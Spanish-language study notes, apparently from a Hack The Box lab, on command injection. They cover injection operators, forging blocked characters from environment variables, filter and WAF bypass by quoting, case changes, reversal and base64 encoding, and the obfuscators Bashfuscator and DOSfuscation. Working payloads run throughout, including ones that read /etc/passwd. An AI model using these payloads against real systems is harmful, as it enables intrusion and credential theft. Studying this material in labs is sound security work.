Separadores para las inyecciones:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | ;                       | %3b                       | Both                                       |
| New Line               | \n                      | %0a                       | Both                                       |
| Background             | &                       | %26                       | Both (second output generally shown first) |
| Pipe                   | \|                      | %7c                       | Both (only second output is shown)         |
| AND                    | &&                      | %26%26                    | Both (only if first succeeds)              |
| OR                     | \|\|                    | %7c%7c                    | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | %60%60                    | Both **(Linux-only)**                      |
| Sub-Shell              | $()                     | %24%28%29                 | Both **(Linux-only)**                      |
| Space                  |                         | %09                       |                                            |
También puede funcionar como espacio poner `${IFS}` Que es una variable de entorno de linux y esta será reemplazada por un espacio en nuestro comando.
Si usamos las `{}` tambien pondra espacios entre medio por ejemplo: `{ls,-la}`
LL

Common operators:

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&` `&`                                      |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

Saltar de linea también puede funcionar en varios casos

# Forjado de comandos

## Linux

Las barras `/` y `\` se suelen usar para los comandos y sueles estar restringidas para eso utilizamos una técnica para ir quedándonos con ese carácter solo que queremos desde otros comandos, por ejemplo, para este sabemos que por ejemplo la variable path tendría las barras que necesitamos:

```
Olvidix@htb[/htb]$ echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```

Sabiendo que nos da esto podemos hacer el siguiente comando para quedarnos solo con el carácter que necesitamos:

```
Olvidix@htb[/htb]$ echo ${PATH:0:1}

/
```
>[!Nota]
>Cabe destacar que en nuestro forjado del comando no usaremos el `echo` del comando.

También podremos sacar el `;` de aquí:
```
Olvidix@htb[/htb]$ echo ${LS_COLORS:10:1}

;
```

Entonces podremos hacer comandos como:
```
127.0.0.1${LS_COLORS:10:1}${IFS}
```

Tambien hay una tecnica de forjado especial que es la traduccion al ASCII con el comando `tr`:

  ```bash
  tr '!-}' '"-~'
  ```

  - `'!-}'` → rango ASCII 33–125
  - `'"-~'` → rango ASCII 34–126
  - Resultado: **cada carácter se desplaza +1** en la tabla ASCII.

  ### Ejemplo: obtener `\` sin escribirlo

  `\` es ASCII 92. El carácter anterior es `[` (ASCII 91).

  ```bash
  echo $(tr '!-}' '"-~' <<<[)
  # Salida: \
  ```

  Pasos:
  1. `<<<[` envía `[` como entrada a `tr`.
  2. `tr` lo desplaza +1 → `\`.
  3. `echo` imprime `\`.

  ### Receta general

  4. Buscar en `man ascii` el carácter que necesitas.
  5. Tomar el **anterior** (valor ASCII − 1).
  6. Sustituirlo en: `echo $(tr '!-}' '"-~' <<<X)` donde `X` es el carácter anterior.

  > Útil para bypassear filtros/WAFs en RCE cuando ciertos caracteres están bloqueados.
## Windows
Para el `\` en CMD:
```
C:\htb> echo %HOMEPATH:~6,-11%

\
```

Para el `\` y el espacio en PowerShell:
```
PS C:\htb> $env:HOMEPATH[0]

\

PS C:\htb> $env:PROGRAMFILES[10]
PS C:\htb>
```
>[!Nota]
>También podemos usar el comando de `Get-ChildItem Env:` de PowerShell para imprimir todas las variables de entorno y luego elegir una de ellas para producir el carácter que necesitamos.

# Bypassing WAFs

## Estos servirán tanto para Windows como para Linux:

```
Olvidix@htb[/htb]$ w'h'o'am'i

Olvidix
```

```
Olvidix@htb[/htb]$ w"h"o"am"i

Olvidix
```

## Especificos para Linux
```
who$@ami

w\ho\am\i
```

```
Olvidix@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

Olvidix
```

```
%0a(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")

Olvidix
```

```
$(a="WhOaMi";printf %s "${a,,}")

Olvidix
```

### Inversión de comandos
```
echo 'whoami' | rev
imaohw
```
Sabiendo esto:

```
Olvidix@htb[/htb]$ $(rev<<<'imaohw')
Olvidix
```

Creo que en el modulo final de HTb me ffunciono algo como:
```
$(c'a't%09${PATH:0:1}flag.txt)
```
Para tenerlo en cuenta, aunque no se si funciona

### Comandos codificados
```
Olvidix@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```
o
```
Olvidix@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Entonces después:
```
Olvidix@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```
>[!Nota]
>Hay que tener en cuenta que usamos <<< para sustituir a la `|` que esta filtrada.


## Especificos para Windows
```
C:\htb> who^ami

Olvidix
```

```
PS C:\htb> WhOaMi

Olvidix
```

### Inversión de comandos
```
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

Sabiendo esto:
```
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

Olvidix
```
### Comandos codificados
```
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```
Entonces después:
```
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

Olvidix
```

# Herramientas automática

## Linux (Bashfuscator)
Instalación:
```
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.zshrc
```

Para usarlo es:
```
bashfuscator -c 'cat /etc/passwd'
```
Aunque si lo usamos tal cual puede generarnos un comando muy largo o con caracteres que no podemos poner. Para ello podemos usar diferentes flags como estas:
```
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

Para probar que ha ido bien podemos probar el comando con:
```
bash -c '[COMANDO_GENERADO]'
```
## Windows (DOSfuscation)
Instalación:
```
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

Uso:
```
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

Este para probarlo en CMD directamente cogeremos el comando generado y lo pegaremos.

>[!Nota]
>Esta herramienta se puede usar en nuestra Kali para generarlo y poder llevarnoslo para ello necesitariamos instalar el pwsh.

Para imstalar powershell en la Kali: (Esto debería de ir en otro sitio)
Pasos en tu Kali
 1. Instalar PowerShell
  En Kali ya viene en los repos:

  sudo apt update
  sudo apt install -y powershell

  Comprueba:

  pwsh --version

  2. Clonar la herramienta

  git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
  cd Invoke-DOSfuscation

  3. Lanzar pwsh y cargar el módulo

  pwsh

  Ya dentro del prompt PS />:

  Import-Module ./Invoke-DOSfuscation.psd1
  Invoke-DOSfuscation